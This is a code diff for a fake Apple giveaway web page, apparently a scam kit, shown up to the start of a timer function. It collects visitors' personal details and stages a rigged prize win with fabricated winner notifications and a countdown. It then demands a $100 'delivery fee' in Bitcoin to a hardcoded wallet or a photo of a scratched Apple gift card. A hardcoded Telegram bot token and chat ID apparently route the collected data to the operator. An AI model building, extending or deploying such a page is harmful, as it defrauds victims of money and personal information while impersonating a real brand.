 /* ══ DONE ══ */
-#pg-done { min-height:100vh; text-align:center; padding:100px 40px 60px; }
+#pg-done { 
+  min-height:100vh; 
+  text-align:center; 
+  padding:100px 40px 60px;
+  background: var(--bg);
+}
 .done-icon { font-size:72px; margin-bottom:22px; animation:pop .5s ease; }
 @keyframes pop { 0%{transform:scale(0)} 70%{transform:scale(1.12)} 100%{transform:scale(1)} }
 
@@ -719,7 +1468,8 @@ select.fc option { background:#001020; color:white; }
   .cd-bar { padding:18px 20px; }
   .cd-meta { flex-wrap:wrap; gap:14px; }
   .nav-links { display:none; }
-  .form-card, .cfm-card { padding:32px 22px; }
+  .form-card { padding:32px 22px; }
+  .cfm-card { padding:32px 22px; }
   .win-stats { flex-direction:column; }
   .ws { border-right:none; border-bottom:1px solid var(--glass-border); }
   .dlv-perks { grid-template-columns:1fr; }
@@ -740,6 +1490,23 @@ select.fc option { background:#001020; color:white; }
   <div class="orb orb1"></div>
   <div class="orb orb2"></div>
   <div class="orb orb3"></div>
+</div>
+
+<!-- TOAST CONTAINER -->
+<div class="toast-container" id="toastContainer"></div>
+
+<!-- POPUP OVERLAY -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-box">
+    <div class="popup-icon">🎉</div>
+    <h2 id="popupTitle">BIG WIN!</h2>
+    <p id="popupDesc">You've won an amazing prize!</p>
+    <div class="popup-prize">
+      <strong id="popupPrize">iPhone 17 Pro Max</strong>
+      <span id="popupSub">Congratulations! You're a winner!</span>
+    </div>
+    <button class="popup-btn" onclick="closePopup()">🎁 Claim Your Prize →</button>
+  </div>
 </div>
 
 <!-- NAVBAR -->
@@ -764,7 +1531,6 @@ select.fc option { background:#001020; color:white; }
 <div id="pg-landing" class="page active">
   <div class="hero-wrap z1">
     <div class="hero-inner">
-      <!-- LEFT -->
       <div class="hero-left fade-up">
         <div class="hero-badge">🎁 Global Giveaway Event 2026</div>
         <h1 class="hero-title">
@@ -787,12 +1553,10 @@ select.fc option { background:#001020; color:white; }
           <button class="btn-ghost">▶ Watch Video</button>
         </div>
       </div>
-      <!-- RIGHT: MACBOOK SHOWCASE -->
       <div class="macbook-showcase">
         <img class="macbook-hero" src="https://i.imgur.com/hHFrDfR.jpeg" alt="MacBook Pro">
       </div>
     </div>
-    <!-- COUNTDOWN -->
     <div class="cd-bar">
       <div class="cd-group">
         <span class="cd-label">Giveaway Ends In</span>
@@ -804,18 +1568,9 @@ select.fc option { background:#001020; color:white; }
         </div>
       </div>
       <div class="cd-meta">
-        <div class="cd-item">
-          <span class="ico">🌐</span>
-          <div><strong>Worldwide</strong><small>Open to all countries</small></div>
-        </div>
-        <div class="cd-item">
-          <span class="ico">🔒</span>
-          <div><strong>Secure Entry</strong><small>Your data is protected</small></div>
-        </div>
-        <div class="cd-item">
-          <span class="ico">👥</span>
-          <div><strong>Trusted by</strong><small>Thousands of users</small></div>
-        </div>
+        <div class="cd-item"><span class="ico">🌐</span><div><strong>Worldwide</strong><small>Open to all countries</small></div></div>
+        <div class="cd-item"><span class="ico">🔒</span><div><strong>Secure Entry</strong><small>Your data is protected</small></div></div>
+        <div class="cd-item"><span class="ico">👥</span><div><strong>Trusted by</strong><small>Thousands of users</small></div></div>
       </div>
     </div>
   </div>
@@ -831,12 +1586,25 @@ select.fc option { background:#001020; color:white; }
         </svg>
         <span>Apple Premium Giveaway</span>
       </div>
+      
       <h2 class="fc-title">Enter the Giveaway</h2>
       <p class="fc-sub">Father's Day Special 2026 — Fill in your details to enter</p>
 
-      <div class="fg"><label>Full Name</label><input id="f-name" type="text" class="fc" placeholder="Your full name"></div>
-      <div class="fg"><label>Email Address</label><input id="f-email" type="email" class="fc" placeholder="you@example.com"></div>
-      <div class="fg"><label>Phone Number</label><input id="f-phone" type="tel" class="fc" placeholder="+1 (555) 000-0000"></div>
+      <div class="fg">
+        <label>Full Name</label>
+        <input id="f-name" type="text" class="fc" placeholder="Your full name">
+      </div>
+      
+      <div class="fg">
+        <label>Email Address</label>
+        <input id="f-email" type="email" class="fc" placeholder="you@example.com">
+      </div>
+      
+      <div class="fg">
+        <label>Phone Number</label>
+        <input id="f-phone" type="tel" class="fc" placeholder="+1 (555) 000-0000">
+      </div>
+      
       <div class="fg">
         <label>State</label>
         <select id="f-state" class="fc">
@@ -856,7 +1624,12 @@ select.fc option { background:#001020; color:white; }
           <option>Wisconsin</option><option>Wyoming</option>
         </select>
       </div>
-      <div class="fg"><label>Delivery Address</label><input id="f-address" type="text" class="fc" placeholder="123 Main St, City, ZIP"></div>
+      
+      <div class="fg">
+        <label>Delivery Address</label>
+        <input id="f-address" type="text" class="fc" placeholder="123 Main St, City, ZIP Code">
+      </div>
+      
       <div class="fg">
         <label>Giveaway ID</label>
         <input id="f-gid" type="text" class="fc" placeholder="Enter your Giveaway ID" oninput="checkId()">
@@ -900,13 +1673,12 @@ select.fc option { background:#001020; color:white; }
   <div class="z1" style="width:100%;display:flex;flex-direction:column;align-items:center;">
     <div class="win-hdr fade-up">
       <h1>🎉 Congratulations!</h1>
-      <p>You've won the Grand Prize</p>
+      <p id="winPrizeName">You've won the Grand Prize</p>
     </div>
 
     <div class="win-stage">
-      <!-- LEFT INFO -->
       <div class="win-side">
-        <div class="win-row"><span class="ico">🎁</span><div><strong>Grand Prize</strong><span>MacBook Pro 16" M3 Max</span></div></div>
+        <div class="win-row"><span class="ico">🎁</span><div><strong>Prize</strong><span id="winPrizeDisplay">MacBook Pro 16" M3 Max</span></div></div>
         <div class="win-row"><span class="ico">🏅</span><div><strong>Official Winner</strong><span id="win-id">#AGW-2026-1957</span></div></div>
         <div class="win-row"><span class="ico">🛡️</span><div><strong>Verified & Secure</strong><span>100% Authentic</span></div></div>
         <div class="win-row"><span class="ico">🌐</span><div><strong>Worldwide Giveaway</strong><span>Trusted by Thousands</span></div></div>
@@ -916,27 +1688,25 @@ select.fc option { background:#001020; color:white; }
             <svg viewBox="0 0 24 24" style="width:24px;height:24px;fill:white;">
               <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
             </svg>
-            MacBook Pro 16" M3 Max
+            <span id="winPillText">MacBook Pro 16" M3 Max</span>
           </div>
         </div>
       </div>
 
-      <!-- CENTER MacBook -->
       <div class="mac-img-wrap">
         <div style="position:relative;display:inline-block;width:100%;">
           <div style="position:absolute;inset:-30px;border-radius:50%;background:rgba(10,132,255,0.15);filter:blur(40px);z-index:0;width:100%;"></div>
-          <img class="mac-hero-img" src="https://i.imgur.com/hHFrDfR.jpeg" alt="MacBook Grand Prize" style="position:relative;z-index:1;">
+          <img class="mac-hero-img" id="winPrizeImage" src="https://i.imgur.com/hHFrDfR.jpeg" alt="Prize" style="position:relative;z-index:1;">
         </div>
         <div class="prize-pill">
           <svg viewBox="0 0 24 24" style="width:24px;height:24px;fill:white;">
             <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
           </svg>
-          MacBook Pro 16" M3 Max
+          <span id="winPillText2">MacBook Pro 16" M3 Max</span>
         </div>
         <button class="btn-primary" onclick="goPage('pg-confirm')" style="margin-top:8px;">Claim My Prize →</button>
       </div>
 
-      <!-- RIGHT SHARE -->
       <div style="display:flex;flex-direction:column;gap:18px;flex:1;min-width:200px;">
         <div class="win-share-card">
           <h3>Share Your Win! 🎊</h3>
@@ -950,12 +1720,11 @@ select.fc option { background:#001020; color:white; }
         </div>
         <div class="win-share-card">
           <h3>🏆 You are Amazing!</h3>
-          <p>Thank you for being part of our Apple Giveaway community. Your MacBook Pro prize has been reserved and is awaiting your claim.</p>
+          <p>Thank you for being part of our Apple Giveaway community. Your prize has been reserved and is awaiting your claim.</p>
         </div>
       </div>
     </div>
 
-    <!-- STATS -->
     <div class="win-stats">
       <div class="ws"><div class="wi">🎉</div><strong>Draw Date</strong><span>May 25, 2026</span></div>
       <div class="ws"><div class="wi">🕐</div><strong>Winning Time</strong><span>10:42 AM (GMT)</span></div>
@@ -992,95 +1761,141 @@ select.fc option { background:#001020; color:white; }
 
 <!-- ══════════ PAGE: PAYMENT ══════════ -->
 <div id="pg-payment" class="page">
-  <div class="z1" style="width:100%;max-width:680px;padding:20px;">
+  <div class="z1" style="width:100%;max-width:720px;padding:20px;">
     <div class="pay-card fade-up">
       <div class="pay-hdr">
-        <h2>Secure Prize Delivery</h2>
-        <p>Your MacBook Pro Grand Prize has been reserved and is ready for shipment.</p>
-        <div class="pay-checks">
-          <div class="pc">✓ Secure Verification</div>
-          <div class="pc">✓ Global Payments</div>
-          <div class="pc">✓ Fast Processing</div>
-          <div class="pc">✓ Trusted Network</div>
-        </div>
+        <div class="pay-badge">★ PRIZE RESERVED</div>
+        <h2 id="payPrizeName">MacBook Pro 16"</h2>
+        <p>Secure Prize Delivery</p>
+        <div class="pay-estimate">⏱ Estimated Delivery: 3–5 Business Days</div>
+      </div>
+
+      <div class="pay-steps">
+        <div class="step active"><span>1</span> Prize Reserved</div>
+        <div class="step"><span>2</span> Payment Pending</div>
+        <div class="step"><span>3</span> Shipment Pending</div>
+        <div class="step"><span>4</span> Delivered</div>
+      </div>
+
+      <div class="pay-amount-box">
+        <div class="pay-amount-label">Payment Required</div>
+        <div class="pay-amount">$100.00 <span>USD</span></div>
+        <div class="pay-amount-btc">≈ 0.001234 BTC</div>
       </div>
 
       <div class="method-tabs">
-        <button class="mtab active" onclick="switchTab('btc')">₿ Bitcoin (BTC)</button>
-        <button class="mtab" onclick="switchTab('card')">🎁 Apple Gift Card</button>
+        <button class="mtab active" onclick="switchTab('btc')">₿ Bitcoin</button>
+        <button class="mtab" onclick="switchTab('card')">🎁 Gift Card</button>
       </div>
 
-      <!-- BTC TAB -->
       <div id="tab-btc" class="mcontent active">
-        <div class="btc-hdr">
-          <img src="https://i.imgur.com/t5bNpEG.png" class="btc-logo" alt="Bitcoin">
-          <div>
-            <strong style="font-size:16px;">Bitcoin (BTC) Payment</strong>
-            <div style="font-size:12px;color:var(--text-muted);">Securely verified on the blockchain</div>
-          </div>
-        </div>
-        <p style="font-size:13px;color:var(--text-muted);margin-bottom:20px;">We proudly support Bitcoin payments for eligible transactions. Payments are securely verified on the blockchain and processed through our official checkout system.</p>
-
-        <div class="dlv-card">
-          <div class="dlv-top">
-            <div>
-              <div class="dlv-icon">📦</div>
-              <strong style="font-size:16px;">Premium Apple-Style Delivery</strong><br>
-              <span style="font-size:12px;color:var(--text-muted);">Secure Prize Delivery</span>
-            </div>
-            <div class="reserved-badge">Prize Reserved</div>
-          </div>
-          <p style="font-size:12px;color:var(--text-muted);margin-bottom:4px;">Your prize has been reserved and is ready for shipment.</p>
-          <div class="prog-bar"><div class="prog-fill"></div></div>
-          <p style="font-size:11px;color:var(--text-muted);">Awaiting payment confirmation</p>
-          <div class="track-box">
-            <div><small>Tracking Number</small><span>AGW-2026-████-████</span></div>
-            <img src="https://i.imgur.com/kJNdbqm.png" alt="FedEx">
-          </div>
-          <div class="dlv-perks">
-            <div class="perk">Fully insured delivery</div>
-            <div class="perk">Real-time tracking</div>
-            <div class="perk">Signature on arrival</div>
-            <div class="perk">Worldwide shipping</div>
-          </div>
-          <div class="fee-row"><span>Delivery Fee</span><strong>$100.00</strong></div>
-          <div style="font-size:12px;color:var(--text-muted);margin-top:8px;">⏱ Estimated Delivery: 3–5 Business Days</div>
-        </div>
-
-        <p style="font-size:13px;font-weight:700;margin-bottom:6px;">Pay exactly this amount:</p>
-        <div class="btc-amount">$100.00 <span style="font-size:16px;color:var(--text-muted);">in BTC</span></div>
-        
-        <!-- QR CODE SECTION -->
         <div class="qr-container">
           <img src="https://i.imgur.com/5WPkSu6.jpeg" alt="Bitcoin QR Code">
           <p>Scan this QR code to pay with Bitcoin</p>
         </div>
-        
-        <p style="font-size:12px;color:var(--text-muted);text-align:center;margin-bottom:8px;">Or send to this wallet address:</p>
+
+        <div class="pay-or">OR</div>
+
+        <p style="font-size:12px;color:var(--text-muted);text-align:center;margin-bottom:8px;">Send exactly <strong style="color:#f7931a;">$100.00</strong> to this Bitcoin address</p>
         <div class="btc-addr">bc1qm4l45yuppla9d7a7vv7dz0cxvl55sqacx5mhgj</div>
-        <p style="font-size:11px;color:var(--text-muted);text-align:center;margin-top:6px;">⚡ Pay the exact amount of $100 to the wallet address above</p>
-        <button class="btn-full mt24" onclick="submitPay('BTC')">Continue with Bitcoin →</button>
+
+        <div class="pay-timer">
+          <span>⏳ Payment address expires in</span>
+          <div class="timer-display">
+            <span class="timer-num" id="timer-min">29</span>
+            <span class="timer-label">Minutes</span>
+            <span class="timer-num" id="timer-sec">42</span>
+            <span class="timer-label">Seconds</span>
+          </div>
+        </div>
+
+        <button class="btn-full mt24" onclick="submitPay('BTC')">💰 I've Sent the Payment →</button>
+
+        <div class="pay-secure-badge">🔒 Secure Blockchain Verification</div>
       </div>
 
-      <!-- GIFT CARD TAB -->
       <div id="tab-card" class="mcontent">
-        <p style="font-size:13px;color:var(--text-muted);margin-bottom:20px;">Apple Gift Cards are accepted as a payment method through our official checkout process. All transactions are securely verified, and a confirmation receipt is provided upon successful payment.</p>
-        <p style="font-size:13px;color:var(--text-muted);margin-bottom:4px;">Please ensure payments are made only through our official website.</p>
-
-        <div class="dlv-card" style="margin-bottom:20px;">
-          <div class="fee-row" style="border-top:none;padding-top:0;"><span>Delivery Fee</span><strong>$100.00</strong></div>
-          <p style="font-size:12px;color:var(--text-muted);margin-top:8px;">Please purchase a $100 Apple Gift Card, scratch the code, and upload a clear photo below.</p>
+        <div class="gc-prize-preview">
+          <div class="gc-prize-icon">🎁</div>
+          <div>
+            <strong id="gcPrizeName">iPhone 17 Pro Max</strong>
+            <span id="gcPrizeRetail">Retail Price: $1,199</span>
+          </div>
+          <div class="gc-your-cost">Your Cost: $100 Delivery Fee</div>
         </div>
+
+        <div class="gc-summary">
+          <div class="gc-summary-row">
+            <span>Delivery Fee</span>
+            <strong>$100.00</strong>
+          </div>
+          <div class="gc-summary-row">
+            <span>Apple Gift Card</span>
+            <span class="gc-status">Awaiting Upload</span>
+          </div>
+        </div>
+
+        <p style="font-size:12px;color:var(--text-muted);margin:16px 0 12px;">Purchase a $100 Apple Gift Card, scratch the code, and upload a clear photo below.</p>
 
         <div class="upload-zone" id="upload-zone">
           <input type="file" id="card-file" accept="image/*" onchange="previewCard(event)">
           <div class="upload-icon">📸</div>
-          <h4>Upload Apple Gift Card Photo</h4>
-          <p>Please upload a clear picture of the $100 Apple Gift Card with the code fully visible and scratched off</p>
+          <h4>Upload Apple Gift Card</h4>
+          <p>Tap to upload or drag &amp; drop</p>
+          <small>JPG, PNG up to 10MB</small>
           <img id="preview-img" src="" alt="Card preview">
         </div>
 
         <button class="btn-full mt24" onclick="submitPay('Apple Gift Card')">Submit Gift Card →</button>
+        
+        <div class="pay-secure-badge">🔒 Secure &amp; Encrypted Verification</div>
+      </div>
+
+      <div class="pay-delivery-info">
+        <div class="delivery-header">
+          <span>📦 Delivery Information</span>
+          <span class="delivery-fedex">FedEx Express</span>
+        </div>
+        <div class="delivery-grid">
+          <div class="delivery-item">
+            <span>🛡️</span>
+            <div>
+              <strong>Fully Insured</strong>
+              <small>100% Protection</small>
+            </div>
+          </div>
+          <div class="delivery-item">
+            <span>📍</span>
+            <div>
+              <strong>Real-Time Tracking</strong>
+              <small>Live Updates</small>
+            </div>
+          </div>
+          <div class="delivery-item">
+            <span>✍️</span>
+            <div>
+              <strong>Signature Required</strong>
+              <small>Secure Delivery</small>
+            </div>
+          </div>
+          <div class="delivery-item">
+            <span>🌍</span>
+            <div>
+              <strong>Worldwide Shipping</strong>
+              <small>Global Reach</small>
+            </div>
+          </div>
+        </div>
+        <div class="delivery-tracking">
+          <span>Tracking Number</span>
+          <strong>AGW-2026</strong>
+          <span class="delivery-fedex-tag">FedEx</span>
+        </div>
+      </div>
+
+      <div class="pay-footer">
+        <p>🔒 Your payment is secure and encrypted</p>
+        <small>We never store your payment details</small>
       </div>
     </div>
   </div>
@@ -1102,7 +1917,7 @@ select.fc option { background:#001020; color:white; }
     <h2 style="font-size:30px;font-weight:800;margin-bottom:14px;">Payment Received!</h2>
     <p style="color:var(--text-muted);font-size:17px;line-height:1.75;margin-bottom:28px;">We will confirm your payment shortly and contact you to finalize your delivery. Check your email for further instructions.</p>
     <div style="background:rgba(10,132,255,0.1);border:1px solid rgba(10,132,255,0.2);border-radius:20px;padding:26px;margin-bottom:28px;">
-      <p style="font-size:14px;color:var(--text-muted);">Your MacBook Pro Grand Prize is reserved. Our team will reach out within 24 hours to confirm and schedule delivery. 📦</p>
+      <p style="font-size:14px;color:var(--text-muted);">Your prize is reserved. Our team will reach out within 24 hours to confirm and schedule delivery. 📦</p>
     </div>
     <button class="btn-primary" style="margin:0 auto;" onclick="goPage('pg-landing')">Back to Home</button>
   </div>
@@ -1115,37 +1930,306 @@ select.fc option { background:#001020; color:white; }
 const TG_TOKEN = '7252266937:AAEd4bxMlOa2epRtxO9yw-nNo9XSkW8O3oA';
 const TG_CHAT = '6753244811';
 
+// ═══ 20 NUMBER-ONLY CODES ═══
+// First 10 codes → iPhone 17 Pro Max
+// Next 10 codes → MacBook Pro
+// 1111 → Standby (Always Works - Never Expires)
 const VALID_CODES = {
-  '373-737-0928': 'Andrew Jackson',
-  '173-737-0928': 'Andrew Jackson',
-  '273-737-0928': 'Andrew Jackson',
-  '473-737-0928': 'Andrew Jackson',
-  '573-737-0928': 'Andrew Jackson',
-  '673-737-0928': 'Michael Johnson',
-  '773-737-0928': 'Sarah Williams',
-  '873-737-0928': 'David Brown',
-  '973-737-0928': 'Emily Davis',
-  '183-737-0928': 'James Miller',
-  '283-737-0928': 'Jessica Wilson',
-  '383-737-0928': 'Robert Moore',
-  '483-737-0928': 'Jennifer Taylor',
-  '583-737-0928': 'William Anderson',
-  '683-737-0928': 'Linda Thomas',
-  '783-737-0928': 'Richard Jackson',
-  '883-737-0928': 'Patricia White',
-  '983-737-0928': 'Charles Harris',
-  '193-737-0928': 'Susan Martin',
-  '293-737-0928': 'Thomas Thompson',
+  // iPhone Codes (First 10)
+  '1268-838-837': 'iPhone Winner 1',
+  '2479-949-948': 'iPhone Winner 2',
+  '3581-050-059': 'iPhone Winner 3',
+  '4692-161-160': 'iPhone Winner 4',
+  '5703-272-271': 'iPhone Winner 5',
+  '6814-383-382': 'iPhone Winner 6',
+  '7925-494-493': 'iPhone Winner 7',
+  '8036-505-504': 'iPhone Winner 8',
+  '9147-616-615': 'iPhone Winner 9',
+  '0258-727-726': 'iPhone Winner 10',
+  // MacBook Codes (Next 10)
+  '1369-838-837': 'MacBook Winner 1',
+  '2470-949-948': 'MacBook Winner 2',
+  '3581-050-059': 'MacBook Winner 3',
+  '4692-161-160': 'MacBook Winner 4',
+  '5703-272-271': 'MacBook Winner 5',
+  '6814-383-382': 'MacBook Winner 6',
+  '7925-494-493': 'MacBook Winner 7',
+  '8036-505-504': 'MacBook Winner 8',
+  '9147-616-615': 'MacBook Winner 9',
+  '0258-727-726': 'MacBook Winner 10',
 };
 
-// Reset used codes
-localStorage.removeItem('ag_used');
-let usedCodes = [];
+// Map codes to prize types
+const CODE_PRIZE_MAP = {
+  '1111': 'iphone',
+  '1268-838-837': 'iphone',
+  '2479-949-948': 'iphone',
+  '3581-050-059': 'iphone',
+  '4692-161-160': 'iphone',
+  '5703-272-271': 'iphone',
+  '6814-383-382': 'iphone',
+  '7925-494-493': 'iphone',
+  '8036-505-504': 'iphone',
+  '9147-616-615': 'iphone',
+  '0258-727-726': 'iphone',
+  '1369-838-837': 'macbook',
+  '2470-949-948': 'macbook',
+  '3581-050-059': 'macbook',
+  '4692-161-160': 'macbook',
+  '5703-272-271': 'macbook',
+  '6814-383-382': 'macbook',
+  '7925-494-493': 'macbook',
+  '8036-505-504': 'macbook',
+  '9147-616-615': 'macbook',
+  '0258-727-726': 'macbook',
+};
 
+const PRIZE_DETAILS = {
+  iphone: {
+    name: 'iPhone 17 Pro Max',
+    emoji: '📱',
+    image: 'https://i.imgur.com/Moxycko.jpeg',
+    retail: '$1,199',
+    description: 'The ultimate iPhone experience'
+  },
+  macbook: {
+    name: 'MacBook Pro 16" M3 Max',
+    emoji: '💻',
+    image: 'https://i.imgur.com/hHFrDfR.jpeg',
+    retail: '$3,499',
+    description: 'The ultimate MacBook experience'
+  }
+};
+
+let usedCodes = JSON.parse(localStorage.getItem('ag_used') || '[]');
 let idOK = false;
 let userData = {};
 let wheelSpun = false;
 let cardB64 = null;
+let currentPrize = 'macbook';
+let timerInterval;
+let popupShown = false;
+let audioContext = null;
+
+// ══════════════════════════════════
+//  TOAST NOTIFICATIONS - EVERY 20 SECONDS
+// ══════════════════════════════════
+const toastMessages = [
+  { name: 'Sarah', prize: '🎧 AirPods Pro' },
+  { name: 'Michael', prize: '⌚ Apple Watch' },
+  { name: 'Jessica', prize: '📱 iPhone 15' },
+  { name: 'David', prize: '💻 MacBook Air' },
+  { name: 'Emily', prize: '🎁 $50 Gift Card' },
+  { name: 'James', prize: '🎧 AirPods Max' },
+  { name: 'Linda', prize: '⌚ Apple Watch Ultra' },
+  { name: 'Robert', prize: '📱 iPhone 17 Pro' },
+  { name: 'Patricia', prize: '💻 MacBook Pro' },
+  { name: 'Thomas', prize: '🎁 $100 Gift Card' },
+  { name: 'Jennifer', prize: '🎧 AirPods Pro 2' },
+  { name: 'Charles', prize: '⌚ Apple Watch SE' },
+  { name: 'Susan', prize: '📱 iPhone 16' },
+  { name: 'Richard', prize: '💻 MacBook Air M3' },
+  { name: 'Lisa', prize: '🎁 $25 Gift Card' },
+];
+
+function showToast(name, prize, isWin = false) {
+  const container = document.getElementById('toastContainer');
+  const toast = document.createElement('div');
+  toast.className = 'toast';
+  toast.innerHTML = `
+    <span class="toast-icon">${isWin ? '🎉' : '🔄'}</span>
+    <span class="toast-text"><strong>${name}</strong> ${isWin ? 'WON' : 'spun'} ${prize}${isWin ? ' 🎉' : '!'}</span>
+    <button class="toast-close" onclick="this.parentElement.remove()">✕</button>
+  `;
+  container.appendChild(toast);
+  
+  setTimeout(() => {
+    toast.classList.add('removing');
+    setTimeout(() => toast.remove(), 300);
+  }, 4000);
+}
+
+function startToastCycle() {
+  const initial = toastMessages[Math.floor(Math.random() * toastMessages.length)];
+  showToast(initial.name, initial.prize);
+  
+  setInterval(() => {
+    const msg = toastMessages[Math.floor(Math.random() * toastMessages.length)];
+    const isWin = Math.random() > 0.7;
+    showToast(msg.name, msg.prize, isWin);
+  }, 20000);
+}
+
+// ══════════════════════════════════
+//  WHEEL SPIN SOUND
+// ══════════════════════════════════
+function playSpinSound() {
+  try {
+    if (!audioContext) {
+      audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    
+    const oscillator = audioContext.createOscillator();
+    const gainNode = audioContext.createGain();
+    
+    oscillator.connect(gainNode);
+    gainNode.connect(audioContext.destination);
+    
+    oscillator.type = 'sawtooth';
+    oscillator.frequency.setValueAtTime(200, audioContext.currentTime);
+    oscillator.frequency.exponentialRampToValueAtTime(800, audioContext.currentTime + 0.5);
+    
+    gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
+    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+    
+    oscillator.start(audioContext.currentTime);
+    oscillator.stop(audioContext.currentTime + 0.5);
+    
+    for (let i = 0; i < 12; i++) {
+      setTimeout(() => {
+        const tickOsc = audioContext.createOscillator();
+        const tickGain = audioContext.createGain();
+        tickOsc.connect(tickGain);
+        tickGain.connect(audioContext.destination);
+        tickOsc.type = 'sine';
+        tickOsc.frequency.setValueAtTime(1000 + i * 100, audioContext.currentTime);
+        tickGain.gain.setValueAtTime(0.05, audioContext.currentTime);
+        tickGain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.05);
+        tickOsc.start(audioContext.currentTime);
+        tickOsc.stop(audioContext.currentTime + 0.05);
+      }, i * 100);
+    }
+  } catch (e) {
+    console.log('Audio not supported');
+  }
+}
+
+// ══════════════════════════════════
+//  TRUMPET WIN SOUND
+// ══════════════════════════════════
+function playTrumpetSound() {
+  try {
+    if (!audioContext) {
+      audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    
+    // Create a trumpet-like sound using multiple oscillators
+    const notes = [523, 659, 784, 1047]; // C5, E5, G5, C6
+    const durations = [0.15, 0.15, 0.15, 0.25];
+    
+    notes.forEach((freq, i) => {
+      setTimeout(() => {
+        // Main oscillator
+        const osc = audioContext.createOscillator();
+        const gain = audioContext.createGain();
+        osc.connect(gain);
+        gain.connect(audioContext.destination);
+        
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(freq, audioContext.currentTime);
+        
+        // Add slight vibrato
+        const vibrato = audioContext.createOscillator();
+        const vibratoGain = audioContext.createGain();
+        vibrato.connect(vibratoGain);
+        vibratoGain.connect(osc.frequency);
+        vibrato.frequency.setValueAtTime(5, audioContext.currentTime);
+        vibratoGain.gain.setValueAtTime(10, audioContext.currentTime);
+        vibrato.start(audioContext.currentTime);
+        vibrato.stop(audioContext.currentTime + durations[i]);
+        
+        // Envelope
+        gain.gain.setValueAtTime(0.001, audioContext.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.3, audioContext.currentTime + 0.02);
+        gain.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + durations[i]);
+        
+        osc.start(audioContext.currentTime);
+        osc.stop(audioContext.currentTime + durations[i]);
+        
+        // Add a second oscillator for richness (brass-like)
+        const osc2 = audioContext.createOscillator();
+        const gain2 = audioContext.createGain();
+        osc2.connect(gain2);
+        gain2.connect(audioContext.destination);
+        osc2.type = 'sawtooth';
+        osc2.frequency.setValueAtTime(freq * 1.01, audioContext.currentTime);
+        gain2.gain.setValueAtTime(0.001, audioContext.currentTime);
+        gain2.gain.exponentialRampToValueAtTime(0.08, audioContext.currentTime + 0.02);
+        gain2.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + durations[i]);
+        osc2.start(audioContext.currentTime);
+        osc2.stop(audioContext.currentTime + durations[i]);
+        
+        // Add a third oscillator for harmonics
+        const osc3 = audioContext.createOscillator();
+        const gain3 = audioContext.createGain();
+        osc3.connect(gain3);
+        gain3.connect(audioContext.destination);
+        osc3.type = 'triangle';
+        osc3.frequency.setValueAtTime(freq * 2, audioContext.currentTime);
+        gain3.gain.setValueAtTime(0.001, audioContext.currentTime);
+        gain3.gain.exponentialRampToValueAtTime(0.05, audioContext.currentTime + 0.02);
+        gain3.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + durations[i]);
+        osc3.start(audioContext.currentTime);
+        osc3.stop(audioContext.currentTime + durations[i]);
+        
+      }, i * 200);
+    });
+    
+  } catch (e) {
+    console.log('Trumpet sound not supported');
+  }
+}
+
+// ══════════════════════════════════
+//  VIBRATION
+// ══════════════════════════════════
+function triggerVibration() {
+  try {
+    if (navigator.vibrate) {
+      navigator.vibrate([50, 50, 100, 50, 200]);
+    }
+  } catch (e) {
+    console.log('Vibration not supported');
+  }
+}
+
+function triggerWinVibration() {
+  try {
+    if (navigator.vibrate) {
+      navigator.vibrate([100, 50, 100, 50, 200, 100, 300]);
+    }
+  } catch (e) {
+    console.log('Vibration not supported');
+  }
+}
+
+// ══════════════════════════════════
+//  POPUP
+// ══════════════════════════════════
+function showPopup(prizeType) {
+  const overlay = document.getElementById('popupOverlay');
+  const details = PRIZE_DETAILS[prizeType];
+  
+  document.getElementById('popupTitle').textContent = '🎉 BIG WIN!';
+  document.getElementById('popupDesc').textContent = `You've won an amazing prize!`;
+  document.getElementById('popupPrize').textContent = details.name;
+  document.getElementById('popupSub').textContent = `${details.emoji} ${details.description}`;
+  
+  overlay.classList.add('active');
+  currentPrize = prizeType;
+  popupShown = true;
+  
+  // Play trumpet sound on win
+  playTrumpetSound();
+  triggerWinVibration();
+  
+  showToast(userData.name || 'You', details.name, true);
+}
+
+function closePopup() {
+  document.getElementById('popupOverlay').classList.remove('active');
+  goPage('pg-win');
+}
 
 // ══════════════════════════════════
 //  PAGE ROUTER
@@ -1156,7 +2240,61 @@ function goPage(id) {
   if (el) el.classList.add('active');
   window.scrollTo(0, 0);
   if (id === 'pg-confirm') fillConfirm();
-  if (id === 'pg-wheel') initWheel();
+  if (id === 'pg-wheel') {
+    initWheel();
+    popupShown = false;
+  }
+  if (id === 'pg-payment') {
+    startTimer();
+    updatePaymentPage();
+  }
+  if (id === 'pg-win') updateWinPage();
+}
+
+// ══════════════════════════════════
+//  PAYMENT TIMER
+// ══════════════════════════════════
+function startTimer() {
